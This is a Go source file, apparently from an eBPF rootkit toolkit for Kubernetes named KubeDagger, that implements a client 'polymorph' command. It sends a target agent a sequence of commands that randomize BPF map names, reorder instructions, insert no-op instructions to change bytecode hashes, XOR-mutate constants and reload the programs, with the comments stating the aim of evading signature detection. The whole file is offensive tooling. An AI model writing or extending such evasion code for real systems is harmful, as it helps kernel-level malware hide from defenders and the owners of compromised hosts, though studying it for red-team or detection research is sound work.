package polymorph

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type PolymorphResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, seed, output string) error {
	result := &PolymorphResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"randomize_map_names",
			"rename BPF map FDs with randomized identifiers to evade signature detection",
			"polymorph_randomize_maps",
		},
		{
			"reorder_instructions",
			"reorder independent BPF instructions while preserving semantics",
			"polymorph_reorder_insns",
		},
		{
			"insert_semantic_nops",
			"insert semantically neutral instructions (mov r0,r0; xor r1,r1,r1) to change bytecode hash",
			"polymorph_insert_nops",
		},
		{
			"mutate_constants",
			"XOR constants with seed-derived key and add compensating XOR at use sites",
			"polymorph_mutate_consts",
		},
		{
			"reload_programs",
			"unload current BPF programs and reload with polymorphic variants",
			"polymorph_reload",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + seed
		status := shared.SendCommand(target, "/polymorph", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
